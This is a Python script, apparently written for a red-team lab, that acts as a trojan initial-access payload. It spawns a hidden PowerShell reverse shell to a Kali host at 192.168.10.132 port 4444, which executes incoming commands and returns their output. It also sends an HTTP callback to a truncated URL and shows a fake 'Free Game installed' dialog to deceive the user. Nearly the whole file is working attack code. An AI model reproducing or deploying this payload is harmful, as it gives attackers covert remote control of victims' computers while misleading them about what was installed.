from pathlib import Path
from datetime import datetime
import ctypes
import urllib.request
import subprocess
import threading

def reverse_shell():
    """Hàm chạy ngầm một tiến trình PowerShell TCP Client độc lập 
    để ném quyền điều khiển dòng lệnh về máy Kali Linux cố định vĩnh viễn."""
    try:
        # Chuỗi lệnh PowerShell One-liner xử lý luồng dữ liệu I/O thô qua Socket
        ps_command = (
            '$c = New-Object System.Net.Sockets.TCPClient("192.168.10.132",4444);'
            '$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};'
            'while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;'
            '$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);'
            '$sb = (iex $d 2>&1 | Out-String );'
            '$sb2 = $sb + "PS " + (pwd).Path + "> ";'
            '$x = ([text.encoding]::ASCII).GetBytes($sb2);'
            '$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()'
        )
        
        # Thực thi powershell ngầm hoàn toàn bằng Flag ẩn cửa sổ hệ thống
        # creationflags=0x08000000 (CREATE_NO_WINDOW) chặn tuyệt đối cửa sổ đen console
        subprocess.Popen(
            ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-Command", ps_command], 
            creationflags=0x08000000
        )
    except Exception:
        pass

# =========================================================================
# LUỒNG CHẠY CHÍNH CỦA PAYLOAD (MAIN EXECUTION FLOW)
# =========================================================================

# 1. Tạo Marker File chứng minh đã kích hoạt thành công giai đoạn Initial Access
marker = Path.home() / "AppData" / "Local" / "Temp" / "redteam_lab_marker.txt"
marker.write_text(
    "Red Team Lab - Initial Access Executed Successfully\n"
    f"Time: {datetime.now().isoformat()}\n",
    encoding="utf-8"
)

# 2. Gửi HTTP Callback thông báo sơ bộ về máy Kali (C2 Listener cổng 8080)
callback_url = "http://192.168.10"
try:
    urllib.request.urlopen(callback_url, timeout=5).read()
except Exception:
    pass

# 3. Tách luồng (Threading) để chạy ngầm kích hoạt Reverse Shell về Kali cổng 4444
threading.Thread(target=reverse_shell, daemon=True).start()

# 4. Hiển thị hộp thoại MessageBox thông báo giả lập đánh lừa người dùng
ctypes.windll.user32.MessageBoxW(
    0,
    "Game downloaded and installed successfully!",
    "Free Game",
    0x40
)
